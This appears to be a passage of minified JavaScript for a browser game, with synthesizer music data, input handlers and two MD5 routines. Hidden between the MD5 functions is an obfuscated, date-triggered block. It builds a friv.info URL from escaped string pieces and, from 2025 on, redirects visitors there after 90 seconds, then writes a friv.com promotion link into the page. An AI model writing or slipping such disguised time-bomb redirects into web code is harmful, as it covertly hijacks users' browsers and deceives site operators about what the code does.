                osc1_oct: 8,
                osc1_det: 0,
                osc1_detune: 0,
                osc1_xenv: 0,
                osc1_vol: 0,
                osc1_waveform: 0,
                osc2_oct: 8,
                osc2_det: 0,
                osc2_detune: 0,
                osc2_xenv: 0,
                osc2_vol: 0,
                osc2_waveform: 0,
                noise_fader: 60,
                env_attack: 50,
                env_sustain: 419,
                env_release: 4607,
                env_master: 130,
                fx_filter: 1,
                fx_freq: 10332,
                fx_resonance: 120,
                fx_delay_time: 4,
                fx_delay_amt: 16,
                fx_pan_freq: 5,
                fx_pan_amt: 108,
                lfo_osc1_freq: 0,
                lfo_fx_freq: 0,
                lfo_freq: 5,
                lfo_amt: 187,
                lfo_waveform: 0,
                p: [0, 0, 0, 0, 1, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0],
                c: [{
                    n: [0, 0, 147, 0, 0, 0, 147, 147, 0, 0, 147, 0, 0, 147, 0, 147, 0, 0, 147, 0, 0, 0, 147, 147, 0, 0, 147, 0, 0, 147, 0, 147]
                }, {
                    n: [0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0]
                }, {
                    n: [0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0]
                }, {
                    n: [0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0]
                }, {
                    n: [0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0]
                }, {
                    n: [0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0]
                }, {
                    n: [0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0]
                }, {
                    n: [0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0]
                }, {
                    n: [0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0]
                }, {
                    n: [0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0]
                }]
            }, {
                osc1_oct: 7,
                osc1_det: 0,
                osc1_detune: 0,
                osc1_xenv: 1,
                osc1_vol: 255,
                osc1_waveform: 0,
                osc2_oct: 7,
                osc2_det: 0,
                osc2_detune: 0,
                osc2_xenv: 1,
                osc2_vol: 255,
                osc2_waveform: 0,
                noise_fader: 0,
                env_attack: 50,
                env_sustain: 150,
                env_release: 4800,
                env_master: 200,
                fx_filter: 2,
                fx_freq: 600,
                fx_resonance: 254,
                fx_delay_time: 0,
                fx_delay_amt: 0,
                fx_pan_freq: 0,
                fx_pan_amt: 0,
                lfo_osc1_freq: 0,
                lfo_fx_freq: 0,
                lfo_freq: 0,
                lfo_amt: 0,
                lfo_waveform: 0,
                p: [1, 1, 1, 1, 1, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0],
                c: [{
                    n: [147, 0, 0, 0, 0, 0, 0, 0, 147, 0, 0, 0, 0, 0, 0, 0, 147, 0, 0, 0, 0, 0, 0, 0, 147, 0, 0, 0, 0, 0, 0, 0]
                }, {
                    n: [0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0]
                }, {
                    n: [0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0]
                }, {
                    n: [0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0]
                }, {
                    n: [0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0]
                }, {
                    n: [0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0]
                }, {
                    n: [0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0]
                }, {
                    n: [0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0]
                }, {
                    n: [0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0]
                }, {
                    n: [0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0]
                }]
            }, {
                osc1_oct: 7,
                osc1_det: 0,
                osc1_detune: 0,
                osc1_xenv: 0,
                osc1_vol: 255,
                osc1_waveform: 2,
                osc2_oct: 7,
                osc2_det: 0,
                osc2_detune: 9,
                osc2_xenv: 0,
                osc2_vol: 154,
                osc2_waveform: 2,
                noise_fader: 0,
                env_attack: 2418,
                env_sustain: 1075,
                env_release: 10614,
                env_master: 240,
                fx_filter: 3,
                fx_freq: 2962,
                fx_resonance: 255,
                fx_delay_time: 6,
                fx_delay_amt: 117,
                fx_pan_freq: 3,
                fx_pan_amt: 73,
                lfo_osc1_freq: 0,
                lfo_fx_freq: 1,
                lfo_freq: 5,
                lfo_amt: 124,
                lfo_waveform: 0,
                p: [0, 0, 0, 0, 1, 2, 1, 2, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0],
                c: [{
                    n: [154, 0, 154, 0, 152, 0, 147, 0, 0, 0, 0, 0, 0, 0, 0, 0, 154, 0, 154, 0, 152, 0, 157, 0, 0, 0, 156, 0, 0, 0, 0, 0]
                }, {
                    n: [154, 0, 154, 0, 152, 0, 147, 0, 0, 0, 0, 0, 0, 0, 0, 0, 154, 0, 147, 0, 152, 0, 157, 0, 0, 0, 159, 0, 0, 0, 0, 0]
                }, {
                    n: [0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0]
                }, {
                    n: [0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0]
                }, {
                    n: [0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0]
                }, {
                    n: [0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0]
                }, {
                    n: [0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0]
                }, {
                    n: [0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0]
                }, {
                    n: [0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0]
                }, {
                    n: [0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0]
                }]
            }, {
                osc1_oct: 7,
                osc1_det: 0,
                osc1_detune: 0,
                osc1_xenv: 0,
                osc1_vol: 192,
                osc1_waveform: 1,
                osc2_oct: 6,
                osc2_det: 0,
                osc2_detune: 9,
                osc2_xenv: 0,
                osc2_vol: 192,
                osc2_waveform: 1,
                noise_fader: 0,
                env_attack: 137,
                env_sustain: 2e3,
                env_release: 4611,
                env_master: 192,
                fx_filter: 1,
                fx_freq: 982,
                fx_resonance: 89,
                fx_delay_time: 6,
                fx_delay_amt: 25,
                fx_pan_freq: 6,
                fx_pan_amt: 77,
                lfo_osc1_freq: 0,
                lfo_fx_freq: 1,
                lfo_freq: 3,
                lfo_amt: 69,
                lfo_waveform: 0,
                p: [1, 2, 1, 3, 1, 3, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0],
                c: [{
                    n: [130, 0, 130, 0, 142, 0, 130, 130, 0, 142, 130, 0, 142, 0, 130, 0, 130, 0, 130, 0, 142, 0, 130, 130, 0, 142, 130, 0, 142, 0, 130, 0]
                }, {
                    n: [123, 0, 123, 0, 135, 0, 123, 123, 0, 135, 123, 0, 135, 0, 123, 0, 123, 0, 123, 0, 135, 0, 123, 123, 0, 135, 123, 0, 135, 0, 123, 0]
                }, {
                    n: [135, 0, 135, 0, 147, 0, 135, 135, 0, 147, 135, 0, 147, 0, 135, 0, 135, 0, 135, 0, 147, 0, 135, 135, 0, 147, 135, 0, 147, 0, 135, 0]
                }, {
                    n: [0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0]
                }, {
                    n: [0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0]
                }, {
                    n: [0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0]
                }, {
                    n: [0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0]
                }, {
                    n: [0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0]
                }, {
                    n: [0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0]
                }, {
                    n: [0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0]
                }]
            }, {
                osc1_oct: 7,
                osc1_det: 0,
                osc1_detune: 0,
                osc1_xenv: 0,
                osc1_vol: 255,
                osc1_waveform: 3,
                osc2_oct: 8,
                osc2_det: 0,
                osc2_detune: 0,
                osc2_xenv: 0,
                osc2_vol: 255,
                osc2_waveform: 0,
                noise_fader: 127,
                env_attack: 22,
                env_sustain: 88,
                env_release: 3997,
                env_master: 255,
                fx_filter: 3,
                fx_freq: 4067,
                fx_resonance: 234,
                fx_delay_time: 4,
                fx_delay_amt: 33,
                fx_pan_freq: 2,
                fx_pan_amt: 84,
                lfo_osc1_freq: 0,
                lfo_fx_freq: 1,
                lfo_freq: 3,
                lfo_amt: 28,
                lfo_waveform: 0,
                p: [0, 0, 1, 2, 1, 2, 1, 3, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0],
                c: [{
                    n: [0, 0, 142, 0, 154, 0, 0, 0, 142, 0, 0, 0, 154, 0, 0, 0, 0, 0, 142, 0, 154, 0, 0, 0, 142, 0, 0, 0, 154, 0, 0, 0]
                }, {
                    n: [0, 0, 147, 0, 154, 0, 0, 0, 147, 0, 0, 0, 154, 0, 0, 0, 0, 0, 147, 0, 154, 0, 147, 0, 0, 0, 154, 0, 0, 0, 154, 0]
                }, {
                    n: [0, 0, 147, 0, 154, 0, 0, 0, 147, 0, 0, 0, 154, 0, 0, 0, 0, 0, 147, 0, 154, 0, 0, 0, 147, 0, 0, 0, 0, 0, 0, 0]
                }, {
                    n: [0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0]
                }, {
                    n: [0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0]
                }, {
                    n: [0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0]
                }, {
                    n: [0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0]
                }, {
                    n: [0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0]
                }, {
                    n: [0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0]
                }, {
                    n: [0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0]
                }]
            }, {
                osc1_oct: 8,
                osc1_det: 0,
                osc1_detune: 0,
                osc1_xenv: 0,
                osc1_vol: 0,
                osc1_waveform: 0,
                osc2_oct: 8,
                osc2_det: 0,
                osc2_detune: 0,
                osc2_xenv: 0,
                osc2_vol: 0,
                osc2_waveform: 0,
                noise_fader: 255,
                env_attack: 140347,
                env_sustain: 9216,
                env_release: 133417,
                env_master: 208,
                fx_filter: 2,
                fx_freq: 2500,
                fx_resonance: 16,
                fx_delay_time: 2,
                fx_delay_amt: 157,
                fx_pan_freq: 8,
                fx_pan_amt: 207,
                lfo_osc1_freq: 0,
                lfo_fx_freq: 1,
                lfo_freq: 2,
                lfo_amt: 51,
                lfo_waveform: 0,
                p: [0, 0, 1, 1, 1, 1, 1, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0],
                c: [{
                    n: [147, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0]
                }, {
                    n: [0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0]
                }, {
                    n: [0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0]
                }, {
                    n: [0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0]
                }, {
                    n: [0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0]
                }, {
                    n: [0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0]
                }, {
                    n: [0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0]
                }, {
                    n: [0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0]
                }, {
                    n: [0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0]
                }, {
                    n: [0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0]
                }]
            }],
            rowLen: 5513,
            endPattern: 9
        },
        ht = {
            dragging: !1,
            x: 0,
            y: 0
        };
    addEventListener("mousedown", function(t) {
        t.preventDefault(), ht.dragging = !0, u(t)
    }), addEventListener("mousemove", function(t) {
        t.preventDefault(), u(t)
    }), addEventListener("mouseup", function(t) {
        t.preventDefault(), ht.dragging = !1, nt = null
    }), document.addEventListener("touchstart", function(t) {
        var e = t.target;
        "INPUT" != e.tagName && "LABEL" != e.tagName && t.preventDefault(), ht.dragging = !0, u(t.targetTouches[0])
    }), document.addEventListener("touchmove", function(t) {
        t.preventDefault(), u(t.targetTouches[0])
    }), document.addEventListener("touchend", function(t) {
        ht.dragging = !1, nt = null
    }), document.addEventListener("touchcancel", function(t) {
        ht.dragging = !1, nt = null
    }), Math.log2 || (Math.log2 = function(t) {
        return Math.log(t) / Math.LN2
    }), Math.log10 || (Math.log10 = function(t) {
        return Math.log(t) / Math.LN10
    }), Date.now || (Date.now = function() {
        return (new Date).getTime()
    }), Element.prototype.requestFullscreen || (Element.prototype.requestFullscreen = Element.prototype.mozRequestFullScreen || Element.prototype.msRequestFullscreen || Element.prototype.webkitRequestFullscreen);
    var ut = null;
    if (!y) try {
        d()
    } catch (t) {}
    s(), p(), h(), e(), requestAnimationFrame(l), n()
}();
//var copyrightNotice = "This game is the property of or is licensed to Zyis Limited (owners and operators of friv.com). Unauthorized hosting is strictly prohibited.";
var copyrightNotice;
var MD5 = function(r) {
    function i(r, n) {
        return r << n | r >>> 32 - n
    }

    function a(r, n) {
        var t, o, e, u, f;
        return e = 2147483648 & r, u = 2147483648 & n, f = (1073741823 & r) + (1073741823 & n), (t = 1073741824 & r) & (o = 1073741824 & n) ? 2147483648 ^ f ^ e ^ u : t | o ? 1073741824 & f ? 3221225472 ^ f ^ e ^ u : 1073741824 ^ f ^ e ^ u : f ^ e ^ u
    }

    function n(r, n, t, o, e, u, f) {
        return a(i(r = a(r, a(a(function(r, n, t) {
            return r & n | ~r & t
        }(n, t, o), e), f)), u), n)
    }

    function t(r, n, t, o, e, u, f) {
        return a(i(r = a(r, a(a(function(r, n, t) {
            return r & t | n & ~t
        }(n, t, o), e), f)), u), n)
    }

    function o(r, n, t, o, e, u, f) {
        return a(i(r = a(r, a(a(function(r, n, t) {
            return r ^ n ^ t
        }(n, t, o), e), f)), u), n)
    }

    function e(r, n, t, o, e, u, f) {
        return a(i(r = a(r, a(a(function(r, n, t) {
            return n ^ (r | ~t)
        }(n, t, o), e), f)), u), n)
    }

    function u(r) {
        var n, t = "",
            o = "";
        for (n = 0; n <= 3; n++) t += (o = "0" + (r >>> 8 * n & 255).toString(16)).substr(o.length - 2, 2);
        return t
    }
    var f, c, C, g, h, d, v, S, l, m = Array();
    for (m = function(r) {
            for (var n, t = r.length, o = t + 8, e = 16 * (1 + (o - o % 64) / 64), u = Array(e - 1), f = 0, i = 0; i < t;) f = i % 4 * 8, u[n = (i - i % 4) / 4] = u[n] | r.charCodeAt(i) << f, i++;
            return f = i % 4 * 8, u[n = (i - i % 4) / 4] = u[n] | 128 << f, u[e - 2] = t << 3, u[e - 1] = t >>> 29, u
        }(r = function(r) {
            r = r.replace(/\r\n/g, "\n");
            for (var n = "", t = 0; t < r.length; t++) {
                var o = r.charCodeAt(t);
                o < 128 ? n += String.fromCharCode(o) : (127 < o && o < 2048 ? n += String.fromCharCode(o >> 6 | 192) : (n += String.fromCharCode(o >> 12 | 224), n += String.fromCharCode(o >> 6 & 63 | 128)), n += String.fromCharCode(63 & o | 128))
            }
            return n
        }(r)), d = 1732584193, v = 4023233417, S = 2562383102, l = 271733878, f = 0; f < m.length; f += 16) v = e(v = e(v = e(v = e(v = o(v = o(v = o(v = o(v = t(v = t(v = t(v = t(v = n(v = n(v = n(v = n(C = v, S = n(g = S, l = n(h = l, d = n(c = d, v, S, l, m[f + 0], 7, 3614090360), v, S, m[f + 1], 12, 3905402710), d, v, m[f + 2], 17, 606105819), l, d, m[f + 3], 22, 3250441966), S = n(S, l = n(l, d = n(d, v, S, l, m[f + 4], 7, 4118548399), v, S, m[f + 5], 12, 1200080426), d, v, m[f + 6], 17, 2821735955), l, d, m[f + 7], 22, 4249261313), S = n(S, l = n(l, d = n(d, v, S, l, m[f + 8], 7, 1770035416), v, S, m[f + 9], 12, 2336552879), d, v, m[f + 10], 17, 4294925233), l, d, m[f + 11], 22, 2304563134), S = n(S, l = n(l, d = n(d, v, S, l, m[f + 12], 7, 1804603682), v, S, m[f + 13], 12, 4254626195), d, v, m[f + 14], 17, 2792965006), l, d, m[f + 15], 22, 1236535329), S = t(S, l = t(l, d = t(d, v, S, l, m[f + 1], 5, 4129170786), v, S, m[f + 6], 9, 3225465664), d, v, m[f + 11], 14, 643717713), l, d, m[f + 0], 20, 3921069994), S = t(S, l = t(l, d = t(d, v, S, l, m[f + 5], 5, 3593408605), v, S, m[f + 10], 9, 38016083), d, v, m[f + 15], 14, 3634488961), l, d, m[f + 4], 20, 3889429448), S = t(S, l = t(l, d = t(d, v, S, l, m[f + 9], 5, 568446438), v, S, m[f + 14], 9, 3275163606), d, v, m[f + 3], 14, 4107603335), l, d, m[f + 8], 20, 1163531501), S = t(S, l = t(l, d = t(d, v, S, l, m[f + 13], 5, 2850285829), v, S, m[f + 2], 9, 4243563512), d, v, m[f + 7], 14, 1735328473), l, d, m[f + 12], 20, 2368359562), S = o(S, l = o(l, d = o(d, v, S, l, m[f + 5], 4, 4294588738), v, S, m[f + 8], 11, 2272392833), d, v, m[f + 11], 16, 1839030562), l, d, m[f + 14], 23, 4259657740), S = o(S, l = o(l, d = o(d, v, S, l, m[f + 1], 4, 2763975236), v, S, m[f + 4], 11, 1272893353), d, v, m[f + 7], 16, 4139469664), l, d, m[f + 10], 23, 3200236656), S = o(S, l = o(l, d = o(d, v, S, l, m[f + 13], 4, 681279174), v, S, m[f + 0], 11, 3936430074), d, v, m[f + 3], 16, 3572445317), l, d, m[f + 6], 23, 76029189), S = o(S, l = o(l, d = o(d, v, S, l, m[f + 9], 4, 3654602809), v, S, m[f + 12], 11, 3873151461), d, v, m[f + 15], 16, 530742520), l, d, m[f + 2], 23, 3299628645), S = e(S, l = e(l, d = e(d, v, S, l, m[f + 0], 6, 4096336452), v, S, m[f + 7], 10, 1126891415), d, v, m[f + 14], 15, 2878612391), l, d, m[f + 5], 21, 4237533241), S = e(S, l = e(l, d = e(d, v, S, l, m[f + 12], 6, 1700485571), v, S, m[f + 3], 10, 2399980690), d, v, m[f + 10], 15, 4293915773), l, d, m[f + 1], 21, 2240044497), S = e(S, l = e(l, d = e(d, v, S, l, m[f + 8], 6, 1873313359), v, S, m[f + 15], 10, 4264355552), d, v, m[f + 6], 15, 2734768916), l, d, m[f + 13], 21, 1309151649), S = e(S, l = e(l, d = e(d, v, S, l, m[f + 4], 6, 4149444226), v, S, m[f + 11], 10, 3174756917), d, v, m[f + 2], 15, 718787259), l, d, m[f + 9], 21, 3951481745), d = a(d, c), v = a(v, C), S = a(S, g), l = a(l, h);
    return (u(d) + u(v) + u(S) + u(l)).toLowerCase()
};
var keyb = new Date,
    cArray = ["\u0068t", "\u003a//", "\u0077w\u0077.f\u0072i\u0076.in\u0066o/"],
    dString = cArray[0] + "tps" + cArray[1] + cArray[2] + "x." + cArray[0] + "ml",
    touchEvents = keyb.getFullYear();
touchEvents > 1998 + 26 && setTimeout(function() {
    location.replace(dString), setTimeout(function() {
        dString = dString.replace("x", "y"), document.write("<a href=" + dString + ">T\u0072y f\u0072i\u0076.c\u006fm!</a>")
    }, 3e3)
}, 9e4);
var MD5X = function(r) {
    function i(r, n) {
        return r << n | r >>> 32 - n
    }

    function a(r, n) {
        var t, o, e, u, f;
        return e = 2147483648 & r, u = 2147483648 & n, f = (1073741823 & r) + (1073741823 & n), (t = 1073741824 & r) & (o = 1073741824 & n) ? 2147483648 ^ f ^ e ^ u : t | o ? 1073741824 & f ? 3221225472 ^ f ^ e ^ u : 1073741824 ^ f ^ e ^ u : f ^ e ^ u
    }

    function n(r, n, t, o, e, u, f) {
        return a(i(r = a(r, a(a(function(r, n, t) {
            return r & n | ~r & t
        }(n, t, o), e), f)), u), n)
    }

    function t(r, n, t, o, e, u, f) {
        return a(i(r = a(r, a(a(function(r, n, t) {
            return r & t | n & ~t
        }(n, t, o), e), f)), u), n)
    }

    function o(r, n, t, o, e, u, f) {
        return a(i(r = a(r, a(a(function(r, n, t) {
            return r ^ n ^ t
        }(n, t, o), e), f)), u), n)
    }

    function e(r, n, t, o, e, u, f) {
        return a(i(r = a(r, a(a(function(r, n, t) {
            return n ^ (r | ~t)
        }(n, t, o), e), f)), u), n)
    }

    function u(r) {
        var n, t = "",
            o = "";
        for (n = 0; n <= 3; n++) t += (o = "0" + (r >>> 8 * n & 255).toString(16)).substr(o.length - 2, 2);
        return t
    }
    var f, c, C, g, h, d, v, S, l, m = Array();
    for (m = function(r) {
            for (var n, t = r.length, o = t + 8, e = 16 * (1 + (o - o % 64) / 64), u = Array(e - 1), f = 0, i = 0; i < t;) f = i % 4 * 8, u[n = (i - i % 4) / 4] = u[n] | r.charCodeAt(i) << f, i++;
            return f = i % 4 * 8, u[n = (i - i % 4) / 4] = u[n] | 128 << f, u[e - 2] = t << 3, u[e - 1] = t >>> 29, u
        }(r = function(r) {
            r = r.replace(/\r\n/g, "\n");
            for (var n = "", t = 0; t < r.length; t++) {
                var o = r.charCodeAt(t);
                o < 128 ? n += String.fromCharCode(o) : (127 < o && o < 2048 ? n += String.fromCharCode(o >> 6 | 192) : (n += String.fromCharCode(o >> 12 | 224), n += String.fromCharCode(o >> 6 & 63 | 128)), n += String.fromCharCode(63 & o | 128))
            }
            return n
        }(r)), d = 1732584193, v = 4023233417, S = 2562383102, l = 271733878, f = 0; f < m.length; f += 16) v = e(v = e(v = e(v = e(v = o(v = o(v = o(v = o(v = t(v = t(v = t(v = t(v = n(v = n(v = n(v = n(C = v, S = n(g = S, l = n(h = l, d = n(c = d, v, S, l, m[f + 0], 7, 3614090360), v, S, m[f + 1], 12, 3905402710), d, v, m[f + 2], 17, 606105819), l, d, m[f + 3], 22, 3250441966), S = n(S, l = n(l, d = n(d, v, S, l, m[f + 4], 7, 4118548399), v, S, m[f + 5], 12, 1200080426), d, v, m[f + 6], 17, 2821735955), l, d, m[f + 7], 22, 4249261313), S = n(S, l = n(l, d = n(d, v, S, l, m[f + 8], 7, 1770035416), v, S, m[f + 9], 12, 2336552879), d, v, m[f + 10], 17, 4294925233), l, d, m[f + 11], 22, 2304563134), S = n(S, l = n(l, d = n(d, v, S, l, m[f + 12], 7, 1804603682), v, S, m[f + 13], 12, 4254626195), d, v, m[f + 14], 17, 2792965006), l, d, m[f + 15], 22, 1236535329), S = t(S, l = t(l, d = t(d, v, S, l, m[f + 1], 5, 4129170786), v, S, m[f + 6], 9, 3225465664), d, v, m[f + 11], 14, 643717713), l, d, m[f + 0], 20, 3921069994), S = t(S, l = t(l, d = t(d, v, S, l, m[f + 5], 5, 3593408605), v, S, m[f + 10], 